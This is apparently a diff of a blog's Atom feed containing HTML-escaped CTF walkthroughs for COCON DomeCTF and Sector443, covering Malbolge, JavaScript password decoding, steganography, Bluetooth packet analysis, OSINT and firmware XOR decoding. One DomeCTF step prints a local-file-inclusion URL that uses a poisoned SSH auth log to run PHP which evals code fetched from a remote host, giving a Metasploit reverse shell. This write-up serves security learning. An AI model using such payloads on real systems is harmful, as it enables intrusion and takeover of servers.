+#&quot;!~}|{zyxwvutsrqp.-,+k)(&apos;&amp;amp;}|{Aba`_^]\[ZYXWVUTSRQPONMLhgfedcba`YAW{[ZYXWPUTM
+q43210/.-,+*)(&apos;&amp;amp;%$#?&amp;gt;~&amp;lt;;492765.Rsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIH
 GFEDCBA@?&amp;gt;Z&amp;lt;XWPOTSRQPOHlLK-CHG@?c&amp;amp;%$#&quot;!~}|{zyxwvutsr0/.-,+*)(h&amp;amp;}Cdcba`_^]\[Z
-YXWVUTSihmlkjihgfe^$EDCBA@\[ZYXW9OTSLp3210/.-,+*)('&amp;amp;%$#&quot;&amp;gt;~&amp;lt;5:927654-Qrqponm+
-*#&quot;'&amp;amp;%$#&quot;y?`|{zyxq7XWVUTSRQPONMLKJIHGFEa`_^]\[ZYRWPtT6Lp3INMLEi,+*)('=BA@?&amp;gt;=
+YXWVUTSihmlkjihgfe^$EDCBA@\[ZYXW9OTSLp3210/.-,+*)(&apos;&amp;amp;%$#&quot;&amp;gt;~&amp;lt;5:927654-Qrqponm+
+*#&quot;&apos;&amp;amp;%$#&quot;y?`|{zyxq7XWVUTSRQPONMLKJIHGFEa`_^]\[ZYRWPtT6Lp3INMLEi,+*)(&apos;=BA@?&amp;gt;=
 &amp;lt;;:3W765432r0)Mn&amp;amp;%*#Ghgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;:98765432
-10/.-,+*)('&amp;amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED
-CBA@?&amp;gt;=&amp;lt;;:9876543210/.-,+*)('&amp;amp;%$@?8=&amp;lt;5:98765.Rsrqpon,l$)('~%$#z@x}|{zyxq7Xtm
+10/.-,+*)(&apos;&amp;amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED
+CBA@?&amp;gt;=&amp;lt;;:9876543210/.-,+*)(&apos;&amp;amp;%$@?8=&amp;lt;5:98765.Rsrqpon,l$)(&apos;~%$#z@x}|{zyxq7Xtm
 3Tpoh.ONMLKJ`e^cba`_^]Vz=&amp;lt;;:9876543210/.-,+*)(DCBA@?&amp;gt;=&amp;lt;|{3Wxwvutsrqponmlkjih
-gfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;:9876543210/.-,+*)('&amp;amp;%$#&quot;!~}|{z
+gfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;:9876543210/.-,+*)(&apos;&amp;amp;%$#&quot;!~}|{z
 yxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;:98765QPON0LK
 JIHGFE&amp;gt;b&amp;lt;;@?&amp;gt;=&amp;lt;54Xyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFED`_^]
-?[ZYXWVUNr543210/.-,+*)('&amp;amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSR
-QPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;:9876543210/.-,+*)('&amp;amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfed
-cba`_^]\[ZYXWVUTSRQPlNdchgfedcba`Y}@\UZYXWVOs6543210/.-,+*)('&amp;amp;%A@?!7&amp;lt;;:9870T
-utsrqp.-,+k)('&amp;amp;%|Bcba`_^]\[ZYXWVUTSRnmlkjihJfed]#n
+?[ZYXWVUNr543210/.-,+*)(&apos;&amp;amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSR
+QPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;:9876543210/.-,+*)(&apos;&amp;amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfed
+cba`_^]\[ZYXWVUTSRQPlNdchgfedcba`Y}@\UZYXWVOs6543210/.-,+*)(&apos;&amp;amp;%A@?!7&amp;lt;;:9870T
+utsrqp.-,+k)(&apos;&amp;amp;%|Bcba`_^]\[ZYXWVUTSRnmlkjihJfed]#n
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Which is Malbolge an esoteric programming language we can use an interpreter to get the output of the program?&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;domectf{VknClfWQ4AK6Oo3L0PkC1WCiDgqrO1HW}
@@ -327,12 +952,12 @@ So In this challenge, we have a e-commerce site that sells furnitures.&lt;/p&gt;
 
 &lt;p&gt;Because SSH usernames has a length restriction we cannot execute code directly so we need something small.&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;To get a reverse shell we can use metasploit's web_delivery module
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;To get a reverse shell we can use metasploit&apos;s web_delivery module
    
-https://furniture-shop.domectf.in/dashboard/examples/profile.php?name=../../../../../../../../../var/log/auth&amp;amp;c=php -d allow_url_fopen=true -r &quot;eval(file_get_contents('http://ipaddr:8080/uqB7NiEfaNe'));&quot;
+https://furniture-shop.domectf.in/dashboard/examples/profile.php?name=../../../../../../../../../var/log/auth&amp;amp;c=php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&apos;http://ipaddr:8080/uqB7NiEfaNe&apos;));&quot;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/cocon-xii-ctf/greenland_msf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="ctf" /><category term="jeoprady" /><category term="dome ctf" /><summary type="html">This is the walkthrough for the challenges that were provided as a part of COCON's DomeCTF</summary></entry><entry><title type="html">Sector443 CTF Walkthrough</title><link href="http://localhost:4000/Sector-443-CTF-Walkthrough/" rel="alternate" type="text/html" title="Sector443 CTF Walkthrough" /><published>2019-08-12T00:00:00+05:30</published><updated>2019-08-12T00:00:00+05:30</updated><id>http://localhost:4000/Sector-443-CTF-Walkthrough</id><content type="html" xml:base="http://localhost:4000/Sector-443-CTF-Walkthrough/">&lt;p&gt;This is where it all started I was watching an episode of The Boys when a friend of mine gave me a link to this CTF and asked me to play if I had the time, and I has plenty XD&lt;br /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/cocon-xii-ctf/greenland_msf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Rahul R</name></author><category term="capture the flag" /><category term="infosec" /><category term="ctf" /><category term="jeopardy" /><category term="dome ctf" /><summary type="html">This is the walkthrough for the challenges that were provided as a part of COCON&apos;s DomeCTF</summary></entry><entry><title type="html">Sector443 CTF Walkthrough</title><link href="http://localhost:4000/Sector-443-CTF-Walkthrough/" rel="alternate" type="text/html" title="Sector443 CTF Walkthrough" /><published>2019-08-12T00:00:00+05:30</published><updated>2019-08-12T00:00:00+05:30</updated><id>http://localhost:4000/Sector-443-CTF-Walkthrough</id><content type="html" xml:base="http://localhost:4000/Sector-443-CTF-Walkthrough/">&lt;p&gt;This is where it all started I was watching an episode of The Boys when a friend of mine gave me a link to this CTF and asked me to play if I had the time, and I has plenty XD&lt;br /&gt;
 Most of the challenges where based on reverse engineering binaries.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;WEB&lt;/strong&gt;&lt;/p&gt;
@@ -347,8 +972,8 @@ Most of the challenges where based on reverse engineering binaries.&lt;/p&gt;
     &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dechiffre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pass_enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
         &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tab&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pass_enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-                &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tab2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tab&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pass_enc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tab2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                 &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                 &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                 &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -371,7 +996,7 @@ Most of the challenges where based on reverse engineering binaries.&lt;/p&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
     &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fromCharCode&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dechiffre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x38&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x39&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x37&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x33&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x33&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x35&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x35&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x35&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x36&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x35&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x34&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x37&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x39&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x35&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x36&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x39&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x34&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x36&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x37&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x34&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x39&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x35&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x2c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x32&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x35&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
     
-    &lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Enter password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Enter password&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dechiffre&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
     
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
@@ -393,8 +1018,9 @@ Most of the challenges where based on reverse engineering binaries.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/sector443/sector443_steg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;The challenge gives us a GIF of Captain America flying.
-&lt;img src=&quot;/assets/images/sector443/captain.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The challenge gives us a GIF of Captain America flying.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sector443/captain.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;By running binwalk over it to check for hidden files we can see that there is a RAR file embedded in the GIF.&lt;/p&gt;
 
@@ -418,8 +1044,9 @@ Most of the challenges where based on reverse engineering binaries.&lt;/p&gt;
 
 &lt;p&gt;Now we have to find the Unlock Request , As the challenge description says the the unlock request is send through an app so the Source would be a Smart Phone and the destination is the Smart Lock.&lt;/p&gt;
 
-&lt;p&gt;By Filtering the source and searching for a Value attribute I was able to figure out the Unlock request.
-&lt;img src=&quot;/assets/images/sector443/wireshark1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;By Filtering the source and searching for a Value attribute I was able to figure out the Unlock request.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sector443/wireshark1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;As the image shows a Send Write Request is generated from a Redmi4 to the Smart Lock with the handle of 0x0003 and as per the challenge description there should be 5 requests by counting them I knew this was it.&lt;/p&gt;
 
@@ -427,8 +1054,9 @@ Most of the challenges where based on reverse engineering binaries.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/sector443/sector443_osint.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;In this challenge the goal is to find a person whose name is “Peter Grulich” who likes ponies and we need to find the flag.I started my search in google by entering the following.
-&lt;img src=&quot;/assets/images/sector443/sector443_osint_google.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;In this challenge the goal is to find a person whose name is “Peter Grulich” who likes ponies and we need to find the flag.I started my search in google by entering the following.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/sector443/sector443_osint_google.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/sector443/sector443_osint_git.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -489,8 +1117,8 @@ By doing an NMAP on the IP address we can see that a port 8080 is open which is 
 &lt;p&gt;Now we need to write a script that XORs each byte of the firmware file with each byte of the key.&lt;/p&gt;
 &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
 &lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;inputfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'stage2.bin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;outputfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'decode_stage.bin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'w+b'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;inputfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;stage2.bin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;rb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;outputfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;decode_stage.bin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;w+b&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
